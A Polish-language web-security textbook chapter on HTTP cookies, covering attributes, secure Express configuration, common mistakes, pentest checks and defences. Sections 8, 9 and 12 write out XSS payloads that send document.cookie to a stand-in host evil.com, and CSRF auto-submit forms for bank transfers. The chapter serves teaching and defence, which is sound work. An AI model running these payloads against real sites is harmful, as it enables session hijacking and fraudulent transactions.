# Rozdział 14: Cookies

## 1. Czym są Cookies

**Cookies** (ciasteczka) to małe fragmenty danych przechowywane przez przeglądarkę na żądanie serwera lub kodu JavaScript, automatycznie wysyłane z każdym kolejnym requestem do pasującego domeny/ścieżki.

Cookie to para klucz=wartość z opcjonalnymi atrybutami kontrolującymi cykl życia, zasięg i bezpieczeństwo.

Cookies są mechanizmem **Web API** definiowanym przez RFC 6265 (2011, zastąpił RFC 2965) oraz rozszerzeniami (SameSite w RFC 6265bis, Partitioned Cookies/CHIPS).

### Atrybuty cookie

```
Set-Cookie: name=value; Expires=...; Max-Age=...; Domain=...; Path=...; 
             Secure; HttpOnly; SameSite=Strict|Lax|None; Partitioned

name=value     → klucz i wartość (URL-encoded)
Expires        → data wygaśnięcia (absolut: "Thu, 01 Jan 2026 00:00:00 GMT")
Max-Age        → czas życia w sekundach (nadrzędny nad Expires)
Domain         → dla jakiej domeny cookie (default: current host, bez subdomeny)
Path           → dla jakiej ścieżki (default: "/")
Secure         → wysyłaj tylko przez HTTPS
HttpOnly       → nie dostępne przez document.cookie (JS)
SameSite       → kontrola cross-site (Strict/Lax/None)
Partitioned    → CHIPS — osobna przestrzeń per top-level site
```

### Dostęp przez JavaScript

```javascript
// Odczyt (tylko non-HttpOnly cookies!)
document.cookie; // "name1=value1; name2=value2; ..."

// Zapis (jeden cookie na raz!)
document.cookie = "theme=dark; Path=/; Secure; SameSite=Lax";
// UWAGA: nie nadpisuje wszystkich cookies — dodaje/aktualizuje jeden

// Odczyt konkretnego cookie
function getCookie(name) {
    const match = document.cookie.match(
        new RegExp('(?:^|; )' + name + '=([^;]*)')
    );
    return match ? decodeURIComponent(match[1]) : null;
}

// Usuwanie (ustawiasz Max-Age=0 lub przeszłą datę Expires)
document.cookie = "name=; Max-Age=0; Path=/";
```

### Nagłówki HTTP

```http
# Serwer → Przeglądarka (ustawienie cookie)
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

# Przeglądarka → Serwer (automatyczne wysyłanie)
Cookie: sessionId=abc123; theme=dark; userId=42
```

---

## 2. Dlaczego powstały

### Problem: HTTP jest bezstanowy

HTTP jest protokołem bezstanowym — każde żądanie jest niezależne. Serwer nie "pamięta" poprzednich requestów od tego samego klienta. Jak więc zarządzać sesjami użytkowników?

Netscape w 1994 roku wymyślił cookies jako mechanizm stanu po stronie klienta. Przeglądarka przechowuje dane dostarczone przez serwer i automatycznie je odsyła — serwer może rozpoznać klienta.

### Alternatyw nie było

Przed cookies, stan musiał być przekazywany w URL (query parameters) — co ujawniało go w adresie i historii. Cookies ukryły stan z URL.

---

## 3. Jak działa

### Lifecycle cookie

```
1. Serwer wysyła Set-Cookie
   HTTP/1.1 200 OK
   Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
   
2. Przeglądarka zapisuje cookie (w "cookie jar")
   - Sprawdza Domain, Path, Secure, SameSite
   - Weryfikuje Max-Age/Expires
   
3. Przy kolejnych requestach do tej domeny/ścieżki:
   - Przeglądarka sprawdza które cookies pasują (Domain, Path, Secure, SameSite)
   - Wysyła pasujące w nagłówku Cookie:
   
   GET /dashboard HTTP/1.1
   Cookie: sessionId=abc123
   
4. Cookie wygasa gdy:
   - Minął Max-Age/Expires (session cookie = zamknięcie przeglądarki)
   - Serwer wyślij Max-Age=0
   - Użytkownik wyczyścił cookies
```

### Domain scope

```
Set-Cookie: theme=dark; Domain=example.com
→ Wysyłane do: example.com, sub.example.com, api.example.com

Set-Cookie: theme=dark (bez Domain)
→ Wysyłane tylko do: example.com (exactny host)

Set-Cookie: theme=dark; Domain=.example.com
→ Jak wyżej — subdomenowe

NIEMOŻLIWE:
Set-Cookie: theme=dark; Domain=other.com
→ Przeglądarka ignoruje (ochrona przed cross-domain cookies)
```

### HttpOnly vs JavaScript

```
Bez HttpOnly:
document.cookie = "session=abc"  → pojawi się w document.cookie
document.cookie → "session=abc; theme=dark; ..."

Z HttpOnly:
Set-Cookie: session=abc; HttpOnly
document.cookie → "theme=dark; ..."  ← session jest niewidoczne!
// JavaScript nie może odczytać ani zmodyfikować HttpOnly cookies
// Są wysyłane automatycznie przez przeglądarkę, ale niedostępne dla JS
```

---

## 4. Co dzieje się wewnętrznie

### Cookie Jar — przechowywanie

Przeglądarka przechowuje cookies w "cookie jar" — bazie danych lokalnej (SQLite w Chrome: `Cookies` plik). Każde cookie ma atrybuty które są sprawdzane przy każdym requeście.

### Matching algorithm

Przeglądarka decyduje które cookies wysłać:

1. `Domain` musi pasować (exactny lub suffix z kropką)
2. `Path` musi być prefiksem URL
3. Jeśli `Secure` — tylko HTTPS
4. Jeśli `SameSite=Strict` — tylko same-site requesty
5. Jeśli `SameSite=Lax` — same-site + top-level nawigacja cross-site GET
6. Jeśli `SameSite=None` — wszystko (wymaga Secure!)

### Cookie size limits

- Max wielkość pojedynczego cookie: 4096 bajtów
- Max liczba cookies per domain: 50-150 (zależy od przeglądarki)
- Przekroczenie limitów: przeglądarka może usuwać stare cookies (LRU)

### Third-party cookies — deprecation

Google Chrome (i inne przeglądarki) stopniowo wycofują "third-party cookies" — cookies ustawiane przez domeny inne niż obecna strona (np. reklamy, tracking). Od 2024-2025 Chrome blokuje third-party cookies domyślnie.

---

## 5. Analogiczny przykład z życia

Cookies to znaczki na ręce w parku rozrywki:

- Wchodzisz, kasa (serwer) przybija znaczek (Set-Cookie) na ręce (przeglądarka)
- Przy każdym urządzeniu/atrakcji (request) kasjer sprawdza znaczek (Cookie header)
- Znaczek z datą ważności (Expires/Max-Age)
- Waterproof znaczek (Secure) — nie znika przy deszczu (tylko HTTPS)
- Znaczek pod rękawem (HttpOnly) — tylko kasjerzy widzą, goście nie mogą sami go zdjąć/skopiować
- SameSite — znaczek ważny tylko w tym parku (Strict), lub w pobliskich (Lax)

---

## 6. Przykład kodu

```javascript
// === Serwer Node.js — ustawianie bezpiecznych cookies ===

const express = require('express');
app.use(require('cookie-parser')()); // parsuje Cookie nagłówek

// Logowanie — ustawienie session cookie
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await authenticate(username, password);
    
    if (!user) return res.status(401).json({ error: "Invalid credentials" });
    
    const sessionId = generateSecureSessionId(); // kryptograficznie bezpieczny ID
    await saveSession(sessionId, user.id);
    
    // Bezpieczne ustawienie cookie
    res.cookie("sessionId", sessionId, {
        httpOnly: true,           // JS nie może odczytać
        secure: true,             // tylko HTTPS
        sameSite: "strict",       // tylko same-site requests
        maxAge: 30 * 60 * 1000,  // 30 minut w ms
        path: "/",               // dostępne na całej stronie
        // domain: nie ustawiamy → exactny host (bezpieczniejsze)
    });
    
    res.json({ success: true, user: { id: user.id, name: user.name } });
});

// Wylogowanie — usunięcie cookie
app.post('/logout', (req, res) => {
    res.clearCookie("sessionId", {
        httpOnly: true,
        secure: true,
        sameSite: "strict",
        path: "/"
    });
    res.json({ success: true });
});

// Middleware weryfikujące sesję
app.use('/api', (req, res, next) => {
    const sessionId = req.cookies.sessionId;
    if (!sessionId) return res.status(401).json({ error: "Not authenticated" });
    
    const session = getSession(sessionId);
    if (!session || session.expired) {
        res.clearCookie("sessionId");
        return res.status(401).json({ error: "Session expired" });
    }
    
    req.userId = session.userId;
    next();
});
```

```javascript
// === Frontend — praca z non-HttpOnly cookies ===

// Preferencje użytkownika (nie-wrażliwe — mogą być JS-accessible)
function setPreference(key, value) {
    const date = new Date();
    date.setFullYear(date.getFullYear() + 1); // 1 rok
    document.cookie = `pref_${key}=${encodeURIComponent(value)}; ` +
                      `Expires=${date.toUTCString()}; Path=/; Secure; SameSite=Lax`;
}

function getPreference(key) {
    const match = document.cookie.match(
        new RegExp(`(?:^|; )pref_${key}=([^;]*)`)
    );
    return match ? decodeURIComponent(match[1]) : null;
}

// NIGDY nie przechowuj wrażliwych danych w JS-accessible cookies!
// Tokeny sesji → HttpOnly cookies (serwer zarządza)
// Preferencje UI → JS-accessible cookies lub localStorage
```

---

## 7. Przykład z prawdziwej aplikacji

### Aplikacja bankowa — session management

```http
# Po zalogowaniu:
HTTP/1.1 200 OK
Set-Cookie: __Host-session=abc123xyz; HttpOnly; Secure; SameSite=Strict; Path=/
Set-Cookie: csrfToken=randomValue; Secure; SameSite=Strict; Path=/

# __Host- prefix:
# - wymaga Secure
# - wymaga Path=/
# - zakazuje Domain (czyli exactny host)
# - odporny na cookie injection przez subdomenę

# csrfToken jest JavaScript-readable (brak HttpOnly)
# używany jako Double Submit Cookie pattern
```

### E-commerce — shopping cart

```javascript
// Koszyk przechowywany w cookie (mały rozmiar) lub localStorage
// Cookie zaletą: działa cross-tab, survives refresh, dostępne z serwera

// Serwer ustawia przy pierwszej wizycie:
Set-Cookie: cartId=unique-uuid-here; Max-Age=86400; SameSite=Lax; Secure; Path=/

// Frontend dodaje produkt (przez API):
fetch('/api/cart/add', {
    method: 'POST',
    body: JSON.stringify({ productId: 123, qty: 1 }),
    credentials: 'same-origin' // wysyła cartId cookie automatycznie
});
```

---

## 8. Typowe błędy programistów

### Błąd 1: Brak HttpOnly dla session cookies

```javascript
// BŁĄD: session cookie dostępny przez JS → XSS kradnie sesję
res.cookie("sessionId", id); // brak httpOnly

// XSS payload:
// document.cookie → "sessionId=abc123; ..."
// fetch("evil.com/?s=" + document.cookie)

// POPRAWKA:
res.cookie("sessionId", id, { httpOnly: true });
```

### Błąd 2: Brak Secure na HTTPS

```javascript
// BŁĄD: cookie może być wysłane przez HTTP (nawet na HTTPS stronie po redirect)
res.cookie("session", id, { httpOnly: true }); // brak Secure

// Atak: MITM na HTTP redirect → przechwycenie cookie
// Poprawka:
res.cookie("session", id, { httpOnly: true, secure: true });
```

### Błąd 3: SameSite=None bez Secure

```javascript
// BŁĄD: SameSite=None wymaga Secure
res.cookie("session", id, { sameSite: "none" }); 
// Przeglądarka może odrzucić lub potraktować jako SameSite=Lax

// Poprawka:
res.cookie("session", id, { sameSite: "none", secure: true });
```

### Błąd 4: Zbyt szeroki Domain

```javascript
// BŁĄD: Domain=example.com → cookie wysyłane do WSZYSTKICH subdomen
res.cookie("admin_session", id, { domain: ".example.com" });

// Jeśli attacker kontroluje subdomenę (np. przez subdomain takeover):
// evil.example.com może odczytać cookie z *.example.com!

// Poprawka: nie ustawiaj Domain (exactny host)
res.cookie("admin_session", id, { httpOnly: true, secure: true });
// → cookie wysyłane tylko do api.example.com (exactny host)
```

---

## 9. Znaczenie dla bezpieczeństwa

### Session Hijacking przez XSS

Najczęstszy atak z cookies: XSS kradnie session cookie:

```javascript
// Payload XSS (na stronie bez HttpOnly)
document.location = "https://evil.com/steal?c=" + document.cookie;
// lub
fetch("https://evil.com/steal", {
    method: "POST",
    mode: "no-cors",
    body: document.cookie
});
```

**Ochrona: HttpOnly** — cookies z HttpOnly są niewidoczne dla JavaScript.

### CSRF — Cross-Site Request Forgery

Przeglądarka wysyła cookies automatycznie do każdego requestu do pasującej domeny — nawet jeśli request pochodzi z innej strony:

```html
<!-- Na evil.com — ofiara odwiedza tę stronę -->
<img src="https://bank.com/transfer?to=evil&amount=10000">
<!-- Przeglądarka wyśle GET z cookies użytkownika! -->

<form action="https://bank.com/transfer" method="POST">
    <input name="to" value="evil">
    <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
<!-- POST z cookies! -->
```

**Ochrona: SameSite=Strict lub Lax + CSRF tokens**

### Cookie Theft przez Subdomain

```
Scenariusz:
- Ofiara używa: https://secure.bank.com (cookie Domain=.bank.com)
- Atakujący kontroluje: https://evil.bank.com (np. przez subdomain takeover)
- evil.bank.com może odczytać cookie z Domain=.bank.com przez document.cookie!
```

### Cookie Injection przez HTTP Response Splitting

Jeśli serwer nie sanityzuje wartości cookie, atakujący może wstrzyknąć nowe nagłówki:

```
Set-Cookie: name=value\r\nSet-Cookie: session=hacked
```

### __Secure- i __Host- prefixes

Specjalne prefiksy zapobiegające cookie injection:

```http
Set-Cookie: __Secure-session=abc; Secure
# Wymaga: Secure. Chroni przed HTTP downgrade.

Set-Cookie: __Host-session=abc; Secure; Path=/
# Wymaga: Secure + Path=/ + brak Domain
# Najsilniejszy — tylko exactny host, tylko HTTPS, cała strona
```

### Powiązane CWE

- **CWE-614** — Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- **CWE-1004** — Sensitive Cookie Without 'HttpOnly' Flag
- **CWE-352** — CSRF (związane z SameSite cookies)
- **CWE-539** — Use of Persistent Cookies Containing Sensitive Information

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Application → Cookies

1. Otwórz **Application** (lub **Storage** w Firefox)
2. W lewym panelu: **Cookies** → wybierz domain
3. Dla każdego cookie sprawdź:
   - **HttpOnly** — czy jest zaznaczone? (session cookie BEZ HttpOnly → podatne na XSS)
   - **Secure** — czy jest zaznaczone? (bez Secure → podatne na MITM)
   - **SameSite** — co jest ustawione? (None bez Secure → problem; brak → Lax w nowoczesnych)
   - **Expires/Max-Age** — kiedy wygasa? (session cookie = zamknięcie)

### Burp Suite — analiza cookies

1. **Proxy → HTTP History** → kliknij request → zakładka **Request**
2. Sprawdź `Cookie:` header — które cookies są wysyłane?
3. Kliknij response → sprawdź `Set-Cookie:` — jakie atrybuty?
4. **Intruder / Repeater** — modyfikuj wartości cookies i obserwuj reakcję

### Szukanie wrażliwych cookies

W Burp → Proxy → HTTP History → filtr regex w response headers:
```
Set-Cookie: (?!.*HttpOnly)
# Cookies bez HttpOnly → mogą być kradzione przez XSS

Set-Cookie: (?!.*Secure)
# Cookies bez Secure → mogą być wysyłane HTTP

Set-Cookie: (?!.*SameSite)
# Cookies bez SameSite → starsze zachowanie (zazwyczaj Lax w nowoczesnych)
```

### Sprawdzenie z konsoli

```javascript
// Które cookies są dostępne dla JS (non-HttpOnly)?
console.log(document.cookie);

// Test: czy session cookie jest HttpOnly?
// Jeśli session=... pojawia się w document.cookie → brak HttpOnly → podatne!

// Sprawdź wartości i formaty cookie
document.cookie.split('; ').forEach(c => {
    const [name, value] = c.split('=');
    console.log(name, '=', value?.substring(0, 20) + '...');
});
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy cookies sesji mają HttpOnly (niewidoczne dla JS)?
□ Czy cookies sesji mają Secure (tylko HTTPS)?
□ Czy cookies sesji mają SameSite=Strict lub Lax (CSRF ochrona)?
□ Czy domain cookies jest zawężony (bez .domain = exactny host)?
□ Czy wrażliwe cookies używają prefiksu __Host- lub __Secure-?
□ Czy session cookie jest losowe i kryptograficznie bezpieczne (nie guessable)?
□ Czy cookie expiry jest rozsądny (nie "wieloletni" dla sesji)?
□ Czy logout faktycznie unieważnia cookie po stronie serwera?
□ Czy cookie regeneracja sesji następuje po zalogowaniu (fixation prevention)?
□ Czy third-party cookies są ustawiane (tracking/privacy)?
□ Czy wartości cookie są walidowane po stronie serwera (nie tylko odczytywane)?
□ Czy błędna wartość cookie prowadzi do ujawnienia informacji?
□ Czy można wymusić HTTP przez HTTPS redirect i przechwycić cookie?
□ Czy subdomain cookies mogą być odczytane przez przejęte subdomeny?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Session Theft przez XSS + brak HttpOnly

**Wymagania:** XSS na stronie, session cookie bez HttpOnly.

**Przebieg:**
```javascript
// Payload XSS
new Image().src = "https://evil.com/steal?c=" + encodeURIComponent(document.cookie);

// Lub bardziej dyskretnie:
fetch("https://evil.com/steal", {
    method: "POST",
    mode: "no-cors",
    body: "cookies=" + encodeURIComponent(document.cookie)
});
```

Atakujący odczytuje przesłane cookies → używa session ID do przejęcia sesji.

**Wpływ:** Pełne przejęcie sesji użytkownika.

### Scenariusz 2: CSRF przez brak SameSite

**Wymagania:** Session cookie bez SameSite (lub SameSite=None) i brak CSRF tokenu.

**Przebieg:**
```html
<!-- evil.com — ofiara odwiedza tę stronę (np. przez link w emailu) -->
<form action="https://bank.com/api/transfer" method="POST" id="csrf">
    <input name="to" value="attacker_account">
    <input name="amount" value="5000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

Przeglądarka automatycznie wysyła session cookie z fordem → transfer wykonany.

### Scenariusz 3: Cookie Fixation

**Wymagania:** Aplikacja nie regeneruje session ID po zalogowaniu.

**Przebieg:**
1. Atakujący odwiedza stronę, otrzymuje session ID: `abc123`
2. Atakujący wysyła link do ofiary: `https://bank.com/login?sessionid=abc123`
3. Jeśli aplikacja ustawia cookie z wartości URL: `Set-Cookie: sessionId=abc123`
4. Ofiara loguje się — ale aplikacja nadal używa `abc123` zamiast generować nowego
5. Atakujący używa `abc123` → ma sesję ofiary

---

## 13. Jak się zabezpieczać

### Bezpieczna konfiguracja cookies

```javascript
// Node.js/Express — kompletna bezpieczna konfiguracja
const cookieOptions = {
    httpOnly: true,          // brak dostępu przez JS
    secure: true,            // tylko HTTPS
    sameSite: "strict",      // żadnych cross-site requests
    maxAge: 30 * 60 * 1000, // 30 minut
    path: "/",               // cała aplikacja
    // Nie ustawiamy domain → exactny host
};

// Unikaj zbyt długich sesji
// Unikaj "remember me" bez dodatkowego uwierzytelnienia

// Session cookie z prefiksem __Host-
res.setHeader("Set-Cookie", 
    `__Host-session=${sessionId}; Secure; HttpOnly; SameSite=Strict; Path=/`);
```

### Session regeneracja po logowaniu

```javascript
app.post('/login', async (req, res) => {
    const user = await authenticate(req.body);
    if (!user) return res.status(401).end();
    
    // WAŻNE: zniszcz stary session ID!
    const oldSessionId = req.cookies.sessionId;
    if (oldSessionId) await deleteSession(oldSessionId);
    
    // Utwórz nowy session ID (session fixation prevention)
    const newSessionId = crypto.randomBytes(32).toString('hex');
    await createSession(newSessionId, user.id);
    
    res.cookie("sessionId", newSessionId, cookieOptions);
    res.json({ success: true });
});
```

### Double Submit Cookie CSRF Protection

```javascript
// Backend — generuj CSRF token
app.get('/api/csrf-token', (req, res) => {
    const csrfToken = crypto.randomBytes(32).toString('hex');
    
    // Zapisz w session
    req.session.csrfToken = csrfToken;
    
    // Wyślij jako COOKIE (non-HttpOnly — JS musi go odczytać)
    res.cookie("csrfToken", csrfToken, {
        secure: true,
        sameSite: "strict",
        // NIE httpOnly — frontend musi odczytać!
    });
    
    res.json({ token: csrfToken });
});

// Backend — walidacja
app.post('/api/action', (req, res) => {
    const tokenFromCookie = req.cookies.csrfToken;
    const tokenFromHeader = req.headers["x-csrf-token"];
    
    if (!tokenFromCookie || tokenFromCookie !== tokenFromHeader) {
        return res.status(403).json({ error: "CSRF validation failed" });
    }
    
    // Przetwarzaj żądanie...
});
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Cookies to mechanizm stanu HTTP — wysyłane automatycznie z każdym pasującym requestem
2. `HttpOnly` = niewidoczne dla JavaScript (ochrona przed XSS kradzieżą sesji)
3. `Secure` = tylko HTTPS (ochrona przed MITM)
4. `SameSite=Strict/Lax` = ochrona przed CSRF
5. `__Host-` prefix = najsilniejsza ochrona (Secure + Path=/ + no Domain)

**Najczęstsze nieporozumienia:**

- "HttpOnly chroni przed CSRF" — NIE. HttpOnly blokuje JS, ale cookie jest nadal wysyłane z każdym requestem (w tym cross-site).
- "Secure cookie nie może być przeczytane" — `Secure` tylko kontroluje *kiedy* jest wysyłane (HTTPS). Nie szyfruje wartości ani nie ukrywa przed JS.
- "Cookies są szyfrowane" — NIE. Cookies są przesyłane jako plaintext w nagłówkach (dlatego Secure + HTTPS jest konieczne).

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Application → Cookies** → sprawdź atrybuty każdego cookie
2. **Network** → response headers → `Set-Cookie:` — sprawdź atrybuty
3. **Console** → `document.cookie` → które cookies nie mają HttpOnly?
4. **Burp** → szukaj `Set-Cookie` w HTTP History → sortuj po atrybutach

---

## Powiązania

```
Cookies
    │
    ├──► SameSite Cookies (Rozdział 40)
    │         SameSite atrybut to główna ochrona przed CSRF
    │
    ├──► CHIPS Partitioned Cookies (Rozdział 41)
    │         Partitioned cookies dla third-party z prywatnością
    │
    ├──► CORS (Rozdział 13)
    │         credentials: "include" kontroluje cross-origin cookies
    │
    ├──► Fetch API (Rozdział 11) / XHR (Rozdział 12)
    │         Fetch/XHR wysyłają cookies przez credentials
    │
    ├──► Storage Access API (Rozdział 47)
    │         API do dostępu do third-party cookies
    │
    └──► Credential Management API (Rozdział 45)
                Nowoczesna alternatywa dla cookie-based auth
```
